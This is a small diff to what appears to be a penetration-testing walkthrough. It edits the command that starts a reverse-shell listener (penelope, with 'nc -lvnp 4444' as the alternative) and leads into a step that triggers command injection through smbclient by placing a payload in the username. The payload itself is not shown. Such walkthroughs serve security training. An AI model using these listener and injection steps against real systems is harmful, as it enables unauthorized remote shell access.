@@ -165,7 +165,7 @@ required (OSCP-friendly).
 a full PTY, manages sessions, and logs everything:
 
 ```bash
-penelope 4444          # or: nc -lvnp 4444
+penelope -p 4444       # or: nc -lvnp 4444
 ```
 
 **2. Trigger the injection via `smbclient`** — the payload lives in the username:
